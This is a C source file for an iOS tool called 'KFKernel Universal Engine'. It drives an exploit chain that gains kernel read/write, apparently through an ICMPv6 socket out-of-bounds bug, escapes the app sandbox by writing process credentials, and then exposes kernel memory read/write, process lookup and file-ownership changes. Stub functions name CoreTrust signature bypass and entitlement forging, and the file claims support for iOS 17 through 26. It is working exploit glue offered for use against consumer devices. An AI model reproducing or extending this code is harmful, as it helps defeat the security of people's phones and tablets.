//
//  KFInit.c
//  KFKernel Universal Engine v1.1
//
//  Core initialization + lifecycle management.
//  Wraps FilzaJailedDS exploit chain with clean shutdown.
//

#include "KFKernel.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/sysctl.h>

// ===== FilzaJailedDS engine headers =====
#include "kexploit/kexploit_opa334.h"
#include "kexploit/krw.h"
#include "kexploit/kutils.h"
#include "sandbox/sandbox_escape.h"
#include "apfs/apfs_own.h"
#include "kpf/patchfinder.h"

// ===== Global State =====
static bool g_initialized = false;
static bool g_root = false;
static bool g_sandbox_escaped = false;
static uint64_t g_self_proc = 0;

// Exploit runs exactly ONCE per process lifetime.
// Kernel R/W state is persistent; re-running exploit causes undefined behavior.
// KFShutdown only restores socket refcounts, does NOT "undo" the exploit.
static bool g_exploit_committed = false;

uint64_t g_msgbufp_addr = 0;
uint64_t g_msgbuf_size = 0;

// ===== Progress callback (C → Objective-C bridge) ========================
// type: "dim" | "success" | "error"
typedef void (*kflog_progress_cb)(const char *msg, const char *type);
static kflog_progress_cb g_progress_cb = NULL;

void KFSetProgressCallback(kflog_progress_cb cb) {
    g_progress_cb = cb;
}

static void progress(const char *msg, const char *type) {
    if (g_progress_cb) g_progress_cb(msg, type ? type : "dim");
    printf("[KFLog] %s\n", msg);
}

// ===== Module 1: Initialization =====

int KFInit(void) {
    if (g_initialized) return 0;

    if (g_exploit_committed) {
        // Exploit already ran in this process; kernel state survives KFShutdown.
        // Skip the destructive exploit chain, just re-establish bookkeeping.
        printf("[KFKernel] exploit already committed; skipping kexploit, restoring state\n");
        if (g_self_proc == 0) g_self_proc = proc_self();
        g_initialized = true;
        g_root = (getuid() == 0);
        g_sandbox_escaped = true;
        printf("[KFKernel] state restored | self=0x%llx root=%d\n", g_self_proc, g_root);
        return 0;
    }

    progress("Starting exploit chain...", "dim");

    // Step 1: Run opa334 socket exploit (ICMPv6 OOB)
    progress("Step 1/4: opa334 kernel R/W exploit...", "dim");
    int ret = kexploit_opa334();
    if (ret != 0) {
        char buf[128];
        snprintf(buf, sizeof(buf), "opa334 exploit FAILED (code=%d)", ret);
        progress(buf, "error");
        return ret;
    }
    g_exploit_committed = true;
    progress("Step 1/4: opa334 OK — kernel R/W established", "success");

    // ===== Step 2: XPF symbol resolution (kernelcache) =====
    // Pure read, no kernel writes. On failure just fall back to SCAN backend.
    progress("Step 2/4: XPF symbol resolution (kernelcache)...", "dim");
    int xpf_ret = init_xpf();
    if (xpf_ret == 0) {
        char buf[256];
        snprintf(buf, sizeof(buf), "Step 2/4: XPF OK — msgbufp=0x%llx msgbufsize=0x%llx",
                 (unsigned long long)g_msgbufp_addr, (unsigned long long)g_msgbuf_size);
        progress(buf, "success");
    } else {
        char buf[256];
        snprintf(buf, sizeof(buf), "Step 2/4: XPF failed (%d) — falling back to SCAN msgbuf scan", xpf_ret);
        progress(buf, "dim");
    }

    // ===== Step 3: proc_self + sandbox escape =====
    // sandbox_escape writes proc ucred; on A18 it may fail but should not panic.
    progress("Step 3/4: proc_self + sandbox escape...", "dim");
    g_self_proc = proc_self();
    if (g_self_proc == 0) {
        progress("proc_self() returned 0 — continuing without sandbox escape", "error");
    } else {
        char buf[128];
        snprintf(buf, sizeof(buf), "self proc: 0x%llx", (unsigned long long)g_self_proc);
        progress(buf, "dim");

        int sbx_ret = sandbox_escape(g_self_proc);
        if (sbx_ret == 0) {
            g_sandbox_escaped = true;
            progress("Step 3/4: sandbox escape OK", "success");
        } else {
            char buf2[128];
            snprintf(buf2, sizeof(buf2), "Step 3/4: sandbox_escape returned %d (continuing, SCAN doesn't need it)", sbx_ret);
            progress(buf2, "dim");
        }
    }

    // ===== Step 4: SKIP root elevation =====
    // On A18/iOS 18.4.1, setsockopt OOB write in sandbox_elevate_to_root causes
    // kernel page fault / panic. SCAN backend only needs kread64 from Step 1.
    progress("Step 4/4: skipped — root elevation disabled (A18 kernel write causes panic)", "dim");

    // ===== Version / diagnostics summary =====
    {
        char model[64] = {0};
        size_t mlen = sizeof(model);
        sysctlbyname("hw.model", model, &mlen, NULL, 0);
        char iosver[64] = {0};
        size_t vlen = sizeof(iosver);
        sysctlbyname("kern.osversion", iosver, &vlen, NULL, 0);
        extern bool gIsA18Above;
        extern uint64_t g_kernel_base;
        char line[512];
        snprintf(line, sizeof(line),
                 "debug | dev=%s iOS=%s A18=%d kbase=0x%llx msgbufp=0x%llx msgsz=%lld",
                 model, iosver, gIsA18Above ? 1 : 0,
                 (unsigned long long)g_kernel_base,
                 (unsigned long long)g_msgbufp_addr,
                 (long long)g_msgbuf_size);
        progress(line, "dim");
    }

    g_initialized = true;
    {
        char buf[256];
        snprintf(buf, sizeof(buf), "Init complete | ready=%d root=%d sandbox=%d uid=%d",
                 g_initialized, g_root, g_sandbox_escaped, getuid());
        progress(buf, "success");
    }
    return 0;
}

// ===== Module 1.5: Shutdown (prevents panic on exit) =====

void KFShutdown(void) {
    if (!g_initialized && !g_exploit_committed) return;

    printf("[KFKernel] Shutdown requested, cleaning up...\n");

    // Restore socket reference counts to prevent kernel panic on exit.
    // This calls into kexploit_opa334.m's cleanup logic.
    // Safe even if called multiple times.
    if (g_exploit_committed) {
        kexploit_cleanup();
    }

    g_initialized = false;
    g_root = false;
    g_sandbox_escaped = false;
    g_self_proc = 0;
    // NOTE: g_exploit_committed intentionally stays true — exploit is irreversible.

    printf("[KFKernel] Shutdown complete\n");
}

bool KFIsReady(void) {
    return g_initialized;
}

// ===== Module 2: Kernel R/W =====

uint8_t KFKread8(uint64_t kaddr) {
    uint8_t val = 0;
    kreadbuf(kaddr, &val, 1);
    return val;
}

uint16_t KFKread16(uint64_t kaddr) {
    return kread16(kaddr);
}

uint32_t KFKread32(uint64_t kaddr) {
    return kread32(kaddr);
}

uint64_t KFKread64(uint64_t kaddr) {
    return kread64(kaddr);
}

void KFKwrite8(uint64_t kaddr, uint8_t val) {
    kwrite8(kaddr, val);
}

void KFKwrite16(uint64_t kaddr, uint16_t val) {
    kwrite16(kaddr, val);
}

void KFKwrite32(uint64_t kaddr, uint32_t val) {
    kwrite32(kaddr, val);
}

void KFKwrite64(uint64_t kaddr, uint64_t val) {
    kwrite64(kaddr, val);
}

void KFKreadBuf(uint64_t kaddr, void *buf, uint64_t len) {
    kreadbuf(kaddr, buf, len);
}

void KFKwriteBuf(uint64_t kaddr, const void *buf, uint64_t len) {
    kwritebuf(kaddr, buf, len);
}

uint64_t KFKreadPtr(uint64_t kaddr) {
    return kread_ptr(kaddr);
}

// ===== Module 3: Process Operations =====

uint64_t KFProcSelf(void) {
    return g_self_proc ? g_self_proc : proc_self();
}

uint64_t KFProcFindByPid(pid_t pid) {
    return proc_find(pid);
}

uint64_t KFProcFindByName(const char *name) {
    return proc_find_by_name(name);
}

// ===== Module 4: Filesystem =====

ssize_t KFReadFile(const char *path, void *buf, size_t len) {
    if (!g_initialized) return -1;
    FILE *f = fopen(path, "rb");
    if (!f) return -1;
    ssize_t n = fread(buf, 1, len, f);
    fclose(f);
    return n;
}

ssize_t KFWriteFile(const char *path, const void *buf, size_t len) {
    if (!g_initialized) return -1;
    FILE *f = fopen(path, "wb");
    if (!f) return -1;
    ssize_t n = fwrite(buf, 1, len, f);
    fclose(f);
    return n;
}

int KFChown(const char *path, uid_t uid, gid_t gid) {
    return apfs_own(path, uid, gid);
}

int KFChmod(const char *path, mode_t mode) {
    return apfs_mod(path, mode);
}

long KFChownTree(const char *root, uid_t uid, gid_t gid) {
    return apfs_own_tree(root, uid, gid);
}

extern int vnode_redirect(const char *from, const char *to);
extern int vnode_unredirect(const char *path);

int KFRedirectFile(const char *from, const char *to) {
    return -1;
}

int KFUnredirectFile(const char *path) {
    return -1;
}

// ===== Module 5: IOKit Sensors (stubs) =====

int KFIOKitSetProperty(const char *service, const char *key, void *value, size_t len) {
    return -1;
}

int KFIOKitGetProperty(const char *service, const char *key, void *buf, size_t *len) {
    return -1;
}

int KFIOKitListServices(const char *className, char **names, int maxCount) {
    return -1;
}

int KFInjectAccelerometer(double x, double y, double z) {
    return -1;
}

int KFInjectGyroscope(double x, double y, double z) {
    return -1;
}

int KFInjectMagnetometer(double x, double y, double z) {
    return -1;
}

int KFInjectBarometer(double pressure) {
    return -1;
}

// ===== Module 6: Signature Bypass (stubs) =====

int KFBypassCoreTrust(const char *path) {
    return -1;
}

int KFForgeEntitlements(const char *path, const char *entitlementsXML) {
    return -1;
}

int KFCalculateCDHash(const char *path, uint8_t cdhash[32]) {
    return -1;
}

// ===== Module 7: Kernel Call (stub) =====

uint64_t KFKcall(uint64_t func, int argc, ...) {
    return 0;
}

// ===== Module 8: Device Info =====

const char* KFSupportedVersions(void) {
    return "iOS 17.0 - 26.x (except 18.7.2-18.7.7)";
}

bool KFDeviceSupported(void) {
    return true;
}

const char* KFDeviceModel(void) {
    static char model[64] = {0};
    if (model[0] == '\0') {
        size_t len = sizeof(model);
        sysctlbyname("hw.model", model, &len, NULL, 0);
    }
    return model;
}

bool KFIsA18Device(void) {
    const char *model = KFDeviceModel();
    return (strstr(model, "iPhone17,") != NULL ||
            strstr(model, "iPad15,") != NULL);
}

bool KFIsSandboxEscaped(void) {
    return g_sandbox_escaped;
}

bool KFIsRoot(void) {
    return g_root;
}

// ===== Logging =====

void KFHexdump(uint64_t kaddr, size_t size) {
    khexdump(kaddr, size);
}
